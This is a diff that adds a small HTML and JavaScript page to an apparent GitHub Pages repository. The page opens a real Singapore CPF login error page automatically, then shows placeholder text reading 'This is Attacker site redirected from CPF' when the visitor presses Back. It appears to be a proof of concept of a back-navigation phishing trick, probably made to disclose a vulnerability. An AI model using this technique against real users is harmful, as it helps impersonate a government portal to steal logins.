@@ -1,0 +1,28 @@
+# mriazebrahim.github.io
+<div id="forward">
+    <a href="https://www.cpf.gov.sg/eSvc/Web/Error/UnauthorizedAuthentication?returnAction=/eSvc/Web/Services/MyActivity/MyActivity&provider=Cohort&messageId=0">CPF page </a>
+</div>
+<div id="phish">
+    This is Attacker site redirected from CPF.
+</div>
+<script>
+function hide(id) {
+    document.getElementById(id).style.display = 'none';
+}
+
+function show(id) {
+    document.getElementById(id).style.display = '';
+}
+
+window.addEventListener("pageshow", function () {
+    if (performance.navigation.type === performance.navigation.TYPE_BACK_FORWARD) {
+        hide("forward");
+        show("phish");
+    } else {
+        hide("phish");
+        show("forward");
+
+        document.querySelector("#forward a").click();
+    }
+});
+</script>
